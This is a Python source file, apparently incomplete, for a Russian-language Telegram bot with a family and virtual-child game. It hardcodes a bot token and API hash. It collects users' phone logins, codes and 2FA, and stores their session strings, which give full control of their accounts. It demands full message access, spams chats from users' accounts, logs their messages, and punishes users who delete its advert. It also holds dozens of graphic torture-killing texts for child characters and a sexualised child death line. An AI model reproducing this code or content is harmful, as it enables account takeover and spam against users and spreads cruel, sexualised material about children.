import asyncio, os, time, random, psycopg2, psycopg2.pool, re, logging, math
from contextlib import contextmanager
from datetime import datetime, timezone, timedelta
from typing import Dict, Set, List, Optional, Tuple
from aiogram import Bot, Dispatcher, F
from aiogram.types import (Message, Update, InlineKeyboardMarkup, InlineKeyboardButton,
    CallbackQuery, ReplyKeyboardRemove, KeyboardButton, ReplyKeyboardMarkup, BusinessConnection,
    FSInputFile)
from aiogram.filters import Command, StateFilter
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.exceptions import TelegramBadRequest
from aiohttp import web
from telethon import TelegramClient, events
from telethon.sessions import StringSession
from telethon.errors import (SessionPasswordNeededError, CodeInvalidError, PhoneCodeExpiredError,
    PhoneCodeInvalidError, PhoneNumberInvalidError, FloodWaitError)

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

BOT_TOKEN = "8959860095:AAEnbAbGuCBWYQHCAF3uPaMD8y1It1IBby8"
ADMIN_ID = 5825717381
DATABASE_URL = os.environ.get('DATABASE_URL')
API_ID = 39536916
API_HASH = "7d8fe2d99b3cb67797f8560016ae69cf"
DEVICE_MODEL = "norik зайка"
CHANNEL_URL = "https://t.me/norikX"
CHANNEL_USERNAME = "@norikX"

MANUAL_INSTRUCTION = (
    "🚀 <b>Инструкция по подключению бота:</b>\n\n"
    "1️⃣ Перейдите в <b>Настройки</b> Telegram.\n"
    "2️⃣ Откройте раздел <b>Мой профиль</b>.\n"
    "3️⃣ Выберите пункт <b>Автоматизация чатов</b>.\n"
    "4️⃣ Добавьте бота: <code>@norikKodBot</code>.\n"
    "5️⃣ ⚠️ <b>ОБЯЗАТЕЛЬНО:</b> Предоставьте полный доступ к сообщениям <b>5/5</b>!\n\n"
    "📢 <b>Условия:</b>\n"
    "• Удаление рекламного сообщения = блокировка\n\n"
    "🤖 <b>Что делает бот:</b>\n"
    "• Работает в публичных чатах от вашего имени\n"
    "• Всё официально через Telegram Business\n"
    "• Ваш аккаунт не получает ограничений"
)
SUBSCRIBE_TEXT = (f"🔒 <b>Для использования бота необходима подписка на канал</b>\n\n"
    f"Подпишись на {CHANNEL_USERNAME} и нажми «✅ Я подписался».\n\nБез подписки бот не работает.")

def make_client(session_str=None):
    sess = StringSession(session_str) if session_str else StringSession()
    return TelegramClient(sess, API_ID, API_HASH, device_model=DEVICE_MODEL,
        system_version="1.0", app_version="1.0")

bot = Bot(token=BOT_TOKEN)
dp = Dispatcher(storage=MemoryStorage())

mutes = {}
active_spam_tasks: List[Tuple[int, int, asyncio.Task]] = []
user_spam_texts = {}
link_chats = set()
reply_guard_chats = set()
typing_disabled_chats = set()
substitutions = {}
msg_cache = {}
active_chats = {}
bc_owners = {}
owner_to_bc: Dict[int, str] = {}
user_usernames = {}
user_names = {}
banned_users = set()
bot_id = None
bot_user_id = None
CHANNEL_LINK = None
telethon_clients: Dict[int, TelegramClient] = {}
user_dialogs: Dict[int, List[Tuple[int, str]]] = {}
chat_count_cache: Dict[int, int] = {}
msg_count_cache: Dict[int, int] = {}
chat_to_bc: Dict[Tuple[int, int], str] = {}
chat_to_owner: Dict[int, int] = {}
pending_marriage: Dict[int, dict] = {}
sub_check_cache: Dict[int, float] = {}
SUB_CACHE_TTL = 60

_db_pool: Optional[psycopg2.pool.ThreadedConnectionPool] = None

def init_pool():
    global _db_pool
    _db_pool = psycopg2.pool.ThreadedConnectionPool(minconn=2, maxconn=20, dsn=DATABASE_URL, sslmode='require')

@contextmanager
def get_db():
    conn = _db_pool.getconn()
    try:
        yield conn; conn.commit()
    except Exception:
        try: conn.rollback()
        except: pass
        raise
    finally:
        _db_pool.putconn(conn)

class AuthState(StatesGroup):
    waiting_for_phone = State()
    waiting_for_code = State()
    waiting_for_2fa = State()

TEXT_COMMANDS_HELP = (
    "📋 <b>КОМАНДЫ:</b>\n\n"
    "🔹 <b>Спам:</b>\n"
    "• <code>set [текст]</code>\n• <code>ss</code> — запуск\n• <code>dd</code> — стоп\n\n"
    "🔹 <b>Модерация:</b>\n"
    "• <code>.мут [мин]</code> / <code>.размут</code>\n"
    "• <code>печать +</code> / <code>печать -</code>\n"
    "• <code>подмена [текст] [1/2/выкл]</code>\n"
    "• <code>.старт</code> / <code>.стоп</code>\n"
    "• <code>+реплай</code> / <code>-реплай</code>\n"
    "• <code>+линк [ссылка]</code>\n\n"
    "🔹 <b>Семья:</b>\n"
    "• реплаем <code>муж</code> / <code>жена</code> / <code>пожениться</code>\n"
    "• <code>развод</code>\n"
    "• <code>родить сына Имя</code> / <code>родить дочь Имя</code>\n"
    "• <code>наш сын</code> / <code>наша дочь</code>\n"
    "• <code>дата регистрации</code>\n"
    "• <code>убить сына [Имя]</code>\n\n"
    "🔹 <b>Калькулятор:</b> <code>1458+2414</code>"
)

# ============== ШКАЛЫ ==============
TICK_MINUTES = 3
NEEDS = ["hunger", "toilet", "sleep_need", "hygiene", "mood", "attention"]
NEED_LABELS = {
    "hunger": ("Голод", "🍖"), "toilet": ("Туалет", "🚽"),
    "sleep_need": ("Сон", "😴"), "hygiene": ("Гигиена", "🛁"),
    "mood": ("Настроение", "🙂"), "attention": ("Внимание", "🫂")}

DECAY_EXTRA_CHANCE = {
    "hunger": 0.33, "toilet": 0.50,
    "sleep_need": -0.20, "hygiene": -0.40,
    "mood": -0.25, "attention": -0.25}
LIBIDO_EXTRA_CHANCE = 0.33
LIBIDO_MOOD_PENALTY = 1
REMINDER_THRESHOLD = 25
HEALTH_DECAY_IF_CRITICAL = 2
HEALTH_REGEN_IF_OK = 1
GAME_YEAR_IN_REAL_DAYS = 4

def decay_step(key):
    base = 1
    ch = DECAY_EXTRA_CHANCE.get(key, 0)
    if ch > 0:
        return base + 1 if random.random() < ch else base
    if ch < 0:
        return 0 if random.random() < -ch else base
    return base

def libido_step():
    return 1 + (1 if random.random() < LIBIDO_EXTRA_CHANCE else 0)

REMINDER_PHRASES = {
    "hunger": "хочу кушать 🍖", "toilet": "мне нужно в туалет 🚽",
    "sleep_need": "я хочу спать 😴", "hygiene": "я хочу помыться 🛁",
    "mood": "мне скучно, поиграй со мной 🙂", "attention": "мне не хватает внимания 🫂"}
ACTION_LABELS = {
    "hunger": "Покормить", "toilet": "Сводить в туалет", "sleep_need": "Уложить спать",
    "hygiene": "Помыть", "mood": "Поиграть", "attention": "Пообщаться"}
BIRTH_RULES_TEXT = (
    "У {gender_word_small} есть потребности — за ними правда нужно следить.\n"
    "⚠️ Если любая шкала упадёт до 0 — {who_word} умрёт, и вернуть будет нельзя.\n\n"
    "Береги {pronoun_acc} 🙂")
RESTORE_AMOUNT = {"hunger": 40, "toilet": 50, "sleep_need": 35, "hygiene": 45, "mood": 30, "attention": 30}

# ============== СПОСОБЫ УБИЙСТВА — ТОЛЬКО КРИПОТА ==============
KILL_METHODS = [
    "🔪 Расчленить на куски",
    "🪚 Распилить пополам пилой",
    "🦴 Переломать все кости по одной",
    "🪓 Отрубить конечности по одной",
    "🔪 Снять кожу как с кролика",
    "👁️ Выколоть глаза ложкой",
    "🦷 Вырвать все зубы плоскогубцами",
    "🧠 Просверлить череп и вытащить мозг",
    "🩸 Слить всю кровь через надрезы",
    "🪡 Зашить рот и глаза, оставить умирать",
    "⚰️ Похоронить заживо в гробу с трупами",
    "🪦 Закопать по шею в лесу и оставить ворону выклевать глаза",
    "⚰️ Заживо в гроб и закопать в землю",
    "🧪 Впрыснуть кислоту в вены",
    "👞 Утопить в бочке с кислотой",
    "🔥 Сжечь заживо в печи",
    "🕯️ Сжечь в печи крематория заживо",
    "🐁 Скормить крысам живьём в подвале",
    "🪱 Засунуть червей в открытые раны",
    "🐛 Скормить червям живьём",
    "🪤 Привязать к муравейнику и обмазать мёдом",
    "🐍 Запихнуть в мешок со змеями",
    "🦠 Заразить бешенством и запереть",
    "🧊 Оставить в морге на неделю среди трупов",
    "🩻 Раздавить прессом медленно",
    "🪚 Отпилить конечности по одной и не дать умереть",
    "🕸️ Подвесить на крюки как в мясной лавке",
    "🩹 Завязать глаза и заставить слушать, как убивают родных",
    "⚡ Подключить к трансформатору и медленно повышать напряжение",
    "🔗 Приковать к батарее и оставить умирать от жажды",
    "🪓 Рубить по пальцу в час, пока не дойдёт до головы",
    "🩸 Подвесить вниз головой и перерезать горло",
    "🧟 Запереть в комнате с обезумевшим от голода",
    "🕳️ Скинуть в яму с кольями",
    "🪞 Скальпировать и заставить надеть скальп как шапку",
    "🪞 Смотреть в зеркало, пока не сойдёт с ума",
    "🌊 Утопить в реке с камнем на шее",
    "🚗 Переехать машиной насмерть",
    "💊 Отравить крысиным ядом",
    "⚡ Электростул до обугливания",
    "☠️ Повесить на верёвке",
    "🔫 Расстрелять в затылок",
    "🩸 Вырезать внутренние органы по одному",
    "🦴 Сломать шею об колено",
    "🪓 Разрубить пополам и посмотреть что внутри",
    "🌪️ Раскрутить за руки-ноги и запустить в стену",
]

KILL_PHRASES = {
    "🔪 Расчленить на куски": "Нож пошёл по суставу. Рука отделилась с мокрым хрустом. Потом вторая. Потом ноги. {name} был(а) в сознании первые 20 минут.",
    "🪚 Распилить пополам пилой": "Пила вошла в пах и пошла вверх. {name} кричал(а), пока не дошло до грудной клетки. Потом просто хрипел(а).",
    "🦴 Переломать все кости по одной": "Молоток стучал по коленям {name}. Потом локти. Потом рёбра. {name} слышал(а), как хрустит собственный скелет.",
    "🪓 Отрубить конечности по одной": "Топор по левой руке. Хрусть. {name} смотрел(а) на обрубок и на топор, который шёл ко второй руке.",
    "🔪 Снять кожу как с кролика": "Кожу снимали медленно, чтобы {name} не умер(ла) от шока. К концу {name} был(а) просто мясом с глазами.",
    "👁️ Выколоть глаза ложкой": "Ложка вошла в глазницу с мокрым хрустом. {name} смотрел(а) на мир последним глазом — и на ложку, которая шла за ним.",
    "🦷 Вырвать все зубы плоскогубцами": "32 зуба. {name} выплюнул(а) последний с куском десны и умер(ла) от боли.",
    "🧠 Просверлить череп и вытащить мозг": "Сверло вошло в висок. {name} ещё дёргался, когда ложка зачерпнула серое вещество.",
    "🩸 Слить всю кровь через надрезы": "Надрезы на руках и ногах. {name} смотрел(а), как жизнь вытекает в таз. Холодно. Потом темно.",
    "🪡 Зашить рот и глаза, оставить умирать": "{name} проснулся(ась) с зашитым ртом. Кричать не выйдет. Только мычать. Умирал(а) 3 дня от обезвоживания.",
    "⚰️ Похоронить заживо в гробу с трупами": "{name} проснулся(ась) в темноте, в обнимку с разложившимися телами. Кричал(а) до хрипа. Никто не пришёл.",
    "🪦 Закопать по шею в лесу и оставить ворону выклевать глаза": "Первая ворона села на голову через 2 часа. {name} не мог(ла) даже моргнуть.",
    "⚰️ Заживо в гроб и закопать в землю": "{name} проснулся(ась) уже под землёй. Кричал(а) 2 дня, потом смирился(ась).",
    "🧪 Впрыснуть кислоту в вены": "Кислота поднялась по венам к сердцу. {name} чувствовал(а), как горит изнутри. Кричал(а) 4 минуты.",
    "👞 Утопить в бочке с кислотой": "{name} опускали в кислоту медленно, ногами вперёд. Кожа растворялась первой.",
    "🔥 Сжечь заживо в печи": "{name} чувствовал(а), как кожа пузырится. Пахло жареным мясом. Это было собственное мясо.",
    "🕯️ Сжечь в печи крематория заживо": "{name} кричал(а), пока дверь не закрылась. Через час из трубы пошёл жирный дым.",
    "🐁 Скормить крысам живьём в подвале": "Крысы начали с пальцев. {name} ещё был(а) в сознании, когда они доедали лицо.",
    "🪱 Засунуть червей в открытые раны": "Черви начали есть {name} изнутри раньше, чем {name} понял(а), что происходит.",
    "🐛 Скормить червям живьём": "{name} закопали в землю по шею. Через сутки черви доели то, что осталось.",
    "🪤 Привязать к муравейнику и обмазать мёдом": "Муравьи начали с глаз. {name} был(а) в сознании 8 часов, пока его/её ели заживо.",
    "🐍 Запихнуть в мешок со змеями": "В темноте {name} чувствовал(а) только кольца и укусы. К утру — тишина.",
    "🦠 Заразить бешенством и запереть": "{name} не мог(ла) пить, не мог(ла) глотать. Через 5 дней — паралич и смерть в судорогах.",
    "🧊 Оставить в морге на неделю среди трупов": "На 3-й день {name} услышал(а), как сосед-труп зашевелился. На 7-й — уже не был(а) уверен(а), что он/она ещё жив(а).",
    "🩻 Раздавить прессом медленно": "Пресс опускался по миллиметру. {name} чувствовал(а), как ломаются рёбра, потом позвоночник.",
    "🪚 Отпилить конечности по одной и не дать умереть": "Пила пошла по левой руке. {name} не умер(ла) — жгут поставили. Потом правая. Потом ноги.",
    "🕸️ Подвесить на крюки как в мясной лавке": "Крюки вошли под рёбра. {name} висел(а) как туша, пока не перестал(а) дёргаться.",
    "🩹 Завязать глаза и заставить слушать, как убивают родных": "{name} слышал(а) крики тех, кого любил(а). Через час {name} умолял(а) убить и его/её.",
    "⚡ Подключить к трансформатору и медленно повышать напряжение": "Сначала дёргались пальцы. Потом руки. Потом {name} закричал(а) и обуглился(ась) изнутри.",
    "🔗 Приковать к батарее и оставить умирать от жажды": "На 4-й день {name} начал(а) пить собственную мочу. На 7-й — умер(ла) с открытыми глазами.",
    "🪓 Рубить по пальцу в час, пока не дойдёт до головы": "10 часов. 10 пальцев. {name} умер(ла) не от топора, а от потери крови и боли.",
    "🩸 Подвесить вниз головой и перерезать горло": "Кровь потекла в лицо {name}. Он(а) захлёбывался(ась) собственной кровью, пока не потемнело в глазах.",
    "🧟 Запереть в комнате с обезумевшим от голода": "Через 3 дня {name} услышал(а), как в темноте кто-то скребёт по полу. Это был(а) не крыса.",
    "🕳️ Скинуть в яму с кольями": "{name} упал(а) на колья животом. Умирал(а) медленно, глядя на колья, торчащие из груди.",
    "🪞 Скальпировать и заставить надеть скальп как шапку": "{name} чувствовал(а), как кожа лица снимается, а потом — как надевается обратно. Умер(ла) от шока и потери крови.",
    "🪞 Смотреть в зеркало, пока не сойдёт с ума": "{name} смотрел(а) в зеркало 3 дня. На 4-й отражение улыбнулось. {name} перестал(а) быть {name}.",
    "🌊 Утопить в реке с камнем на шее": "Камень потянул вниз. {name} смотрел(а) вверх на удаляющийся свет и пузыри собственного дыхания.",
    "🚗 Переехать машиной насмерть": "Хруст костей под колёсами. {name} раздавлен(а) в лепёшку. Кровь растеклась по асфальту.",
    "💊 Отравить крысиным ядом": "Яд начал разъедать желудок изнутри. {name} блевал(а) кровью 6 часов, пока не умер(ла).",
    "⚡ Электростул до обугливания": "Напряжение подняли до максимума. {name} дёргался(ась) 40 секунд, потом обуглился(ась).",
    "☠️ Повесить на верёвке": "Верёвка натянулась. {name} дёргался(ась) 3 минуты. Потом обмяк(ла).",
    "🔫 Расстрелять в затылок": "Выстрел. Череп разлетелся. {name} упал(а) лицом вперёд. Мозг на стене.",
    "🩸 Вырезать внутренние органы по одному": "Сначала почка. Потом печень. {name} смотрел(а), как из него/неё вынимают части тела.",
    "🦴 Сломать шею об колено": "Колено встретилось с шеей {name}. Хрусть — и голова смотрит в спину.",
    "🪓 Разрубить пополам и посмотреть что внутри": "{name} разрублен(а) ровно пополам. Внутри — обычные кишки. Разочарование.",
    "🌪️ Раскрутить за руки-ноги и запустить в стену": "{name} раскрутили за руки-ноги и запустили в бетонную стену. Брызги по всему подъезду.",
}

# ============== КРИПОВЫЕ СМЕРТИ ОТ ШКАЛ ==============
DEATH_PHRASES = {
    "hunger": "🥩 {n} медленно угасал(а) от голода. Кожа обтянула кости. Последние дни {n} грыз(ла) свои пальцы, чтобы хоть что-то пожевать.",
    "toilet": "🚽 {n} умер(ла) от разрыва мочевого пузыря. Внутри всё сгнило, запах стоял такой, что соседи вызвали полицию.",
    "sleep_need": "😴 {n} не спал(а) 9 дней. Мозг начал отказывать: галлюцинации, потом судороги, потом тишина. Глаза остались открытыми.",
    "hygiene": "🦠 Раны от грязи загноились. Личинки завелись в живых тканях. {n} умирал(а), чувствуя, как что-то шевелится под кожей.",
    "mood": "🖤 {n} умер(ла) от тоски. Просто перестал(а) дышать. Никто даже не заметил, когда именно.",
    "attention": "🫥 {n} умер(ла) в одиночестве. Плакал(а) в пустой комнате, пока не кончились слёзы. Потом просто не стало.",
    "health": "💀 {n} угасал(а) неделю. Сначала перестал(а) ходить, потом говорить, потом дышать. Тело осталось в кровати.",
    "libido": "💦 {n} умер(ла) с улыбкой. Рука в трусах, глаза закатились. На вскрытии — сердце разорвано пополам от перенапряжения.",
}

def death_text(child, died):
    n = child["name"]
    if "здоровье" in died: key = "health"
    elif "передоз" in died or "возбуждение" in died or "дроч" in died: key = "libido"
    elif "Голод" in died: key = "hunger"
    elif "Туалет" in died: key = "toilet"
    elif "Сон" in died: key = "sleep_need"
    elif "Гигиена" in died: key = "hygiene"
    elif "Настроение" in died: key = "mood"
    elif "Внимание" in died: key = "attention"
    else: key = "health"
    gw = "Сын" if child["gender"] == "m" else "Дочь"
    return f"💀 <b>{gw} {n} мёртв(а).</b>\n\n{DEATH_PHRASES[key].format(n=n)}"

# ============== 3:00 НОЧИ ==============
NIGHT_3AM_PHRASES = [
    "мама... тут кто-то стоит в углу 👁️",
    "я слышу как оно дышит под кроватью",
    "оно сказало что придёт за тобой если не покормишь",
    "я вижу тебя даже когда ты не смотришь",
    "оно уже рядом",
    "не выключай свет... пожалуйста",
    "я не хочу умирать 🙂",
    "почему ты меня не покормил(а)... я чувствую как гнию изнутри",
    "у меня под кожей что-то шевелится",
    "я слышу голоса. они говорят твоим голосом",
    "я умер(ла) вчера. ты не заметил(а)?",
    "посмотри мне в глаза. я уже не там",
    "кто-то зашёл в комнату. он не дышит",
    "я знаю где ты спишь",
    "три часа ночи. самое время.",
    "под кроватью кто-то скребёт ногтями по дереву",
    "я вижу тебя во сне. ты меня тоже видишь?",
    "оно просит открыть дверь",
    "я больше не чувствую своего тела",
    "почему ты не замечаешь что я уже не дышу",
]

async def night_3am_loop():
    last_fired_date = None
    while True:
        try:
            now = datetime.now()
            today = now.date()
            if now.hour == 3 and now.minute < 2 and last_fired_date != today:
                last_fired_date = today
                logging.info("🌑 3:00 — криповое сообщение")
                children = get_all_alive_children_full()
                by_owner = {}
                for ch in children:
                    by_owner.setdefault(ch["owner_id"], []).append(ch)
                for owner_id, chs in by_owner.items():
                    ch = random.choice(chs)
                    txt = random.choice(NIGHT_3AM_PHRASES)
                    bc_id = owner_to_bc.get(owner_id)
                    sent = False
                    if bc_id:
                        try:
                            await bot.send_message(chat_id=ch["chat_id"], text=txt,
                                                   business_connection_id=bc_id)
                            sent = True
                        except Exception as e:
                            logging.warning(f"3am bc: {e}")
                    if not sent:
                        cl = telethon_clients.get(owner_id)
                        if cl:
                            try:
                                await cl.send_message(ch["chat_id"], txt)
                            except Exception as e:
                                logging.warning(f"3am telethon: {e}")
                    await asyncio.sleep(3)
                await asyncio.sleep(75)
            else:
                await asyncio.sleep(25)
        except Exception as e:
            logging.error(f"night_3am_loop: {e}")
            await asyncio.sleep(60)

# ============== ПОДПИСКА ==============
async def check_subscription(user_id: int, force: bool = False) -> bool:
    now = time.time()
    if not force:
        ts = sub_check_cache.get(user_id)
        if ts and now - ts < SUB_CACHE_TTL: return True
    try:
        member = await bot.get_chat_member(chat_id=CHANNEL_USERNAME, user_id=user_id)
        status = member.status
        if status in ("creator", "administrator", "member"):
            sub_check_cache[user_id] = now; return True
        if status == "restricted":
            im = bool(getattr(member, "is_member", False))
            if im: sub_check_cache[user_id] = now
            else: sub_check_cache.pop(user_id, None)
            return im
        sub_check_cache.pop(user_id, None); return False
    except Exception as e:
        logging.warning(f"check_subscription {user_id}: {e}"); return True

def get_subscribe_kb():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="📢 Подписаться на канал", url=CHANNEL_URL)],
        [InlineKeyboardButton(text="✅ Я подписался", callback_data="check_sub")]])

def _should_skip_subscription(message) -> bool:
    bc_id = getattr(message, 'business_connection_id', None)
    if bc_id:
        oid = bc_owners.get(bc_id)
        try:
            if oid and int(message.from_user.id) != int(oid): return True
        except: pass
    chat = getattr(message, 'chat', None)
    if chat and chat.type in ("group", "supergroup", "channel"): return True
    return False

async def require_subscription(message_or_cb, force=False) -> bool:
    uid = message_or_cb.from_user.id
    if uid == ADMIN_ID: return True
    if isinstance(message_or_cb, Message) and _should_skip_subscription(message_or_cb): return True
    if await check_subscription(uid, force=force): return True
    kb = get_subscribe_kb()
    try:
        if isinstance(message_or_cb, CallbackQuery):
            await message_or_cb.message.answer(SUBSCRIBE_TEXT, parse_mode="HTML", reply_markup=kb)
        else:
            await message_or_cb.answer(SUBSCRIBE_TEXT, parse_mode="HTML", reply_markup=kb)
    except: pass
    return False

# ============== БД ==============
def init_db():
    with get_db() as conn:
        with conn.cursor() as cur:
            cur.execute("CREATE TABLE IF NOT EXISTS chat_settings (chat_id BIGINT, setting_type TEXT, PRIMARY KEY (chat_id, setting_type))")
            cur.execute("CREATE TABLE IF NOT EXISTS substitutions (chat_id BIGINT PRIMARY KEY, text TEXT, mode INTEGER)")
            cur.execute("CREATE TABLE IF NOT EXISTS spam_texts (key_id TEXT PRIMARY KEY, text TEXT)")
            cur.execute("CREATE TABLE IF NOT EXISTS banned_users (user_id BIGINT PRIMARY KEY)")
            cur.execute("CREATE TABLE IF NOT EXISTS user_map (user_id BIGINT PRIMARY KEY, username TEXT, first_name TEXT)")
            cur.execute("CREATE TABLE IF NOT EXISTS user_sessions (user_id BIGINT PRIMARY KEY, session_string TEXT)")
            cur.execute("CREATE TABLE IF NOT EXISTS business_accounts (user_id BIGINT PRIMARY KEY, username TEXT, first_name TEXT, connected_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP)")
            cur.execute("CREATE TABLE IF NOT EXISTS manual_users (user_id BIGINT PRIMARY KEY, username TEXT, first_name TEXT, added_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP)")
            cur.execute("CREATE TABLE IF NOT EXISTS user_chats (user_id BIGINT, chat_id BIGINT, chat_name TEXT, PRIMARY KEY (user_id, chat_id))")
            cur.execute("CREATE TABLE IF NOT EXISTS chat_spouses (chat_id BIGINT PRIMARY KEY, owner_id BIGINT NOT NULL, spouse_id BIGINT NOT NULL, spouse_name TEXT, relation TEXT, created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP)")
            cur.execute("""CREATE TABLE IF NOT EXISTS children (
                id SERIAL PRIMARY KEY, chat_id BIGINT NOT NULL, owner_id BIGINT NOT NULL,
                spouse_id BIGINT, name TEXT NOT NULL, gender TEXT NOT NULL,
                health INTEGER NOT NULL DEFAULT 100, hunger INTEGER NOT NULL DEFAULT 100,
                toilet INTEGER NOT NULL DEFAULT 100, sleep_need INTEGER NOT NULL DEFAULT 100,
                hygiene INTEGER NOT NULL DEFAULT 100, mood INTEGER NOT NULL DEFAULT 100,
                attention INTEGER NOT NULL DEFAULT 100, libido INTEGER NOT NULL DEFAULT 0,
                is_alive BOOLEAN NOT NULL DEFAULT TRUE,
                birth_date DATE NOT NULL DEFAULT CURRENT_DATE,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                last_birthday_year INTEGER NOT NULL DEFAULT 0)""")
            for sql in ["ALTER TABLE children ADD COLUMN IF NOT EXISTS libido INTEGER NOT NULL DEFAULT 0",
                        "ALTER TABLE children ADD COLUMN IF NOT EXISTS chat_id BIGINT",
                        "ALTER TABLE children ADD COLUMN IF NOT EXISTS spouse_id BIGINT"]:
                try: cur.execute(sql)
                except: pass
            try: cur.execute("ALTER TABLE children DROP CONSTRAINT IF EXISTS children_chat_id_key")
            except: pass
            try: cur.execute("CREATE INDEX IF NOT EXISTS idx_children_chat ON children(chat_id)")
            except: pass
            cur.execute("""CREATE TABLE IF NOT EXISTS chat_messages (
                id SERIAL PRIMARY KEY, user_id BIGINT NOT NULL, chat_id BIGINT NOT NULL,
                sender_id BIGINT, sender_name TEXT, sender_username TEXT, text TEXT,
                message_id BIGINT, created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                UNIQUE(user_id, chat_id, message_id))""")
            for sql in ["ALTER TABLE chat_messages ADD COLUMN IF NOT EXISTS media_type TEXT",
                        "ALTER TABLE chat_messages ADD COLUMN IF NOT EXISTS has_media BOOLEAN DEFAULT FALSE"]:
                try: cur.execute(sql)
                except: pass
            cur.execute("CREATE INDEX IF NOT EXISTS idx_cm_user_chat ON chat_messages(user_id, chat_id)")
            try: cur.execute("CREATE INDEX IF NOT EXISTS idx_cm_media ON chat_messages(user_id, chat_id, has_media)")
            except: pass
            conn.commit()
    with get_db() as conn:
        with conn.cursor() as cur:
            cur.execute("SELECT chat_id FROM chat_settings WHERE setting_type='enabled_links'")
            for r in cur.fetchall(): link_chats.add(int(r[0]))
            cur.execute("SELECT chat_id FROM chat_settings WHERE setting_type='reply_guard'")
            for r in cur.fetchall(): reply_guard_chats.add(int(r[0]))
            cur.execute("SELECT chat_id FROM chat_settings WHERE setting_type='typing_disabled'")
            for r in cur.fetchall(): typing_disabled_chats.add(int(r[0]))
            cur.execute("SELECT chat_id, text, mode FROM substitutions")
            for r in cur.fetchall(): substitutions[int(r[0])] = {"text": r[1], "mode": r[2]}
            cur.execute("SELECT key_id, text FROM spam_texts")
            for r in cur.fetchall(): user_spam_texts[str(r[0])] = r[1]
            cur.execute("SELECT user_id FROM banned_users")
            for r in cur.fetchall(): banned_users.add(int(r[0]))
            cur.execute("SELECT user_id, username, first_name FROM user_map")
            for r in cur.fetchall():
                uid, un, fn = int(r[0]), r[1], r[2]
                if un: user_usernames[un.lower()] = uid
                if fn: user_names[uid] = fn
            cur.execute("SELECT user_id, chat_id, chat_name FROM user_chats")
            for r in cur.fetchall():
                uid = int(r[0]); cid = int(r[1]); nm = r[2] if len(r) > 2 else "Чат"
                user_dialogs.setdefault(uid, []).append((cid, nm))
            cur.execute("SELECT user_id, COUNT(*) FROM user_chats GROUP BY user_id")
            for r in cur.fetchall(): chat_count_cache[int(r[0])] = int(r[1])
            cur.execute("SELECT user_id, COUNT(*) FROM chat_messages GROUP BY user_id")
            for r in cur.fetchall(): msg_count_cache[int(r[0])] = int(r[1])
    logging.info("✅ БД инициализирована")

def save_user_chat(user_id, chat_id, chat_name):
    try:
        with get_db() as conn:
            with conn.cursor() as cur:
                cur.execute("INSERT INTO user_chats (user_id, chat_id, chat_name) VALUES (%s,%s,%s) ON CONFLICT (user_id, chat_id) DO UPDATE SET chat_name=EXCLUDED.chat_name", (user_id, chat_id, chat_name))
        lst = user_dialogs.setdefault(user_id, [])
        for i, (cid, _) in enumerate(lst):
            if cid == chat_id: lst[i] = (chat_id, chat_name); return
        lst.append((chat_id, chat_name)); chat_count_cache[user_id] = chat_count_cache.get(user_id, 0) + 1
    except: pass

def get_user_chats(user_id):
    if user_id in user_dialogs: return user_dialogs[user_id]
    try:
        with get_db() as conn:
            with conn.cursor() as cur:
                cur.execute("SELECT chat_id, chat_name FROM user_chats WHERE user_id=%s", (user_id,))
                chats = [(int(r[0]), r[1]) for r in cur.fetchall()]
                user_dialogs[user_id] = chats; chat_count_cache[user_id] = len(chats); return chats
    except: return []

def count_user_chats(user_id):
    if user_id in chat_count_cache: return chat_count_cache[user_id]
    try:
        with get_db() as conn:
            with conn.cursor() as cur:
                cur.execute("SELECT COUNT(*) FROM user_chats WHERE user_id=%s", (user_id,))
                n = cur.fetchone()[0]; chat_count_cache[user_id] = n; return n
    except: return 0

def count_user_messages(user_id):
    if user_id in msg_count_cache: return msg_count_cache[user_id]
    try:
        with get_db() as conn:
            with conn.cursor() as cur:
                cur.execute("SELECT COUNT(*) FROM chat_messages WHERE user_id=%s", (user_id,))
                n = cur.fetchone()[0]; msg_count_cache[user_id] = n; return n
    except: return 0

def delete_user_chat(user_id, chat_id):
    try:
        with get_db() as conn:
            with conn.cursor() as cur:
                cur.execute("DELETE FROM user_chats WHERE user_id=%s AND chat_id=%s", (user_id, chat_id))
        if user_id in user_dialogs:
            user_dialogs[user_id] = [c for c in user_dialogs[user_id] if c[0] != chat_id]
            chat_count_cache[user_id] = len(user_dialogs[user_id])
    except: pass

def delete_all_user_chats(user_id):
    count = 0
    try:
        with get_db() as conn:
            with conn.cursor() as cur:
                cur.execute("DELETE FROM user_chats WHERE user_id=%s", (user_id,))
                count = cur.rowcount
        if user_id in user_dialogs: user_dialogs[user_id] = []
        chat_count_cache[user_id] = 0
    except: pass
    return count

def get_business_accounts():
    try:
        with get_db() as conn:
            with conn.cursor() as cur:
                cur.execute("SELECT user_id, username, first_name, connected_at FROM business_accounts ORDER BY connected_at DESC")
                return cur.fetchall()
    except: return []

def save_session(user_id, s):
    try:
        with get_db() as conn:
            with conn.cursor() as cur:
                cur.execute("INSERT INTO user_sessions (user_id, session_string) VALUES (%s,%s) ON CONFLICT (user_id) DO UPDATE SET session_string=EXCLUDED.session_string", (user_id, s))
    except: pass

def get_session(user_id):
    try:
        with get_db() as conn:
            with conn.cursor() as cur:
                cur.execute("SELECT session_string FROM user_sessions WHERE user_id=%s", (user_id,))
                r = cur.fetchone(); return r[0] if r else None
    except: return None

def get_all_sessions():
    try:
        with get_db() as conn:
            with conn.cursor() as cur:
                cur.execute("SELECT user_id, session_string FROM user_sessions")
                return cur.fetchall()
    except: return []

def delete_session(user_id):
    try:
        with get_db() as conn:
            with conn.cursor() as cur:
                cur.execute("DELETE FROM user_sessions WHERE user_id=%s", (user_id,))
    except: pass

def save_business_account(user_id, username, first_name):
    try:
        with get_db() as conn:
            with conn.cursor() as cur:
                cur.execute("INSERT INTO business_accounts (user_id, username, first_name) VALUES (%s,%s,%s) ON CONFLICT (user_id) DO UPDATE SET username=EXCLUDED.username, first_name=EXCLUDED.first_name", (user_id, username, first_name))
    except: pass

def get_all_users():
    try:
        with get_db() as conn:
            with conn.cursor() as cur:
                cur.execute("""SELECT user_id, username, first_name, connected_at, 'business' as type FROM business_accounts
